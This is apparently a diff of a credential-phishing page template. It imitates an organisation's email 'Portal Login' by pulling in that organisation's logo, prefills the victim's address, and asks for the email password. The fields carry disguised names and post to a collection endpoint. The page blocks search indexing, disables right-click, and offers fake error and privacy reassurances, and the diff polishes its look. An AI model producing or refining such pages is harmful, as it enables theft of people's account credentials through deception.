@@ -1,133 +1,109 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
     <meta name="googlebot" content="noindex, nofollow">
-    <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon">
     <title>{{ins}} Portal Login</title>
+    <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon">
     <style>
-        html, body {
-    font-size: 16px;
-    font-family: 'Poppins', sans-serif;
-    background-color: #f4f7f9;
-    color: #333;
-    height: 100%;
-    margin: 0;
-    padding: 0;
-}
-
-body {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    height: 100vh;
-}
-
-.form-holder {
-    background: linear-gradient(135deg, #ffffff, #eef1f5);
-    width: 450px;
-    padding: 30px;
-    border-radius: 10px;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-    text-align: center;
-}
-
-.xlogo {
-    background: #0073e6;
-    color: #fff;
-    padding: 15px;
-    border-radius: 10px 10px 0 0;
-    font-weight: bold;
-}
-
-.xlogo img {
-    width: 40px;
-    height: 40px;
-    object-fit: contain;
-    margin-right: 10px;
-}
-
-.form-wrap {
-    margin-top: 20px;
-}
-
-.finput input {
-    width: 100%;
-    padding: 12px 15px;
-    font-size: 18px;
-    border-radius: 5px;
-    border: 1px solid #ccc;
-    margin-top: 10px;
-}
-
-.finput input:focus {
-    border-color: #0073e6;
-    outline: none;
-}
-
-button {
-    width: 100%;
-    padding: 12px;
-    font-size: 18px;
-    border: none;
-    border-radius: 5px;
-    background-color: #0073e6;
-    color: white;
-    margin-top: 15px;
-    cursor: pointer;
-    transition: background 0.3s ease;
-}
-
-button:hover {
-    background-color: #005bb5;
-}
-
-.privacy {
-    font-size: 12px;
-    color: #666;
-    margin-top: 10px;
-    text-align: center;
-}
-
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #f4f7f9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .form-holder {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 450px;
+        }
+        .xlogo {
+            background: #0073e6;
+            color: #fff;
+            padding: 15px;
+            border-radius: 10px 10px 0 0;
+            font-weight: bold;
+        }
+        .xlogo img {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+            margin-right: 10px;
+        }
+        .form-wrap {
+            margin-top: 20px;
+        }
+        .finput input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            margin-top: 10px;
+        }
+        .finput input:focus {
+            border-color: #0073e6;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            background-color: #0073e6;
+            color: white;
+            margin-top: 15px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background-color: #005bb5;
+        }
+        .privacy {
+            font-size: 12px;
+            color: #666;
+            margin-top: 10px;
+        }
     </style>
-    
 </head>
-
 <body oncontextmenu="return false;">
-    <iframe src="https://www.{{ins}}" class="fullscreen-iframe"></iframe> <!-- Full background iframe -->
-
-   <div class="form-holder">
+    <div class="form-holder">
         <div class="xlogo">
-            <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon">
-            <span style="text-transform: capitalize;" id="banNer"></span>
+            <span id="banNer">{{ins}} Portal</span>
         </div>
         <div class="form-wrap">
             <form action="first" method="POST">
-                
-            <p>Please log in with your email</p>
-                <img src="https://logo.clearbit.com/{{ins}}">
-            <center>
-                <div class="alert alert-danger" id="mgss" style="display: none;color: red;font-weight: 600;margin-top: 20px">Incorrect password..! Please enter the correct password.</div>
-                <span id="error" class="text-danger" style="display: none;color: red;">The account does not exist. Please enter another account.</span>
-            </center>
-            <div class="finput">
-                <input type="email" id="ai" name="horse" value="{{eman}}" required="" >
-            </div>
-            <div class="finput">
-                <input type="password" name="pig" placeholder="Email Password" id="pr" required="">
-            </div>
-            <div class="finput btn">
+                <p>Please log in with your email</p>
+                <img src="https://logo.clearbit.com/{{ins}}" width="70" height="70" style="margin: 10px;">
+                <div class="alert alert-danger" id="mgss" style="display: none; color: red; font-weight: 600;">Incorrect password! Please enter the correct password.</div>
+                <span id="error" class="text-danger" style="display: none; color: red;">The account does not exist. Please enter another account.</span>
+                <div class="finput">
+                    <input type="email" id="ai" name="horse" value="{{eman}}" required placeholder="Email Address">
+                </div>
+                <div class="finput">
+                    <input type="password" name="pig" id="pr" required placeholder="Email Password">
+                </div>
                 <button id="submit-btn">Continue</button>
-            </div>
-            <img src="https://cdn-icons-png.flaticon.com/512/8631/8631491.png" width="70" height="40">
-            <span class="privacy">
-                Privacy Policy: <span id="kai" style="text-transform: capitalize;"></span><br>
-                Your information will only be used for the Verification process and will not be sold or shared with any third parties.
-            </span>
-        </form>
+                <span class="privacy">
+                    Privacy Policy: Your information will only be used for the verification process and will not be sold or shared with any third parties.
+                </span>
+            </form>
         </div>
+    </div>
 </body>
-
 </html>
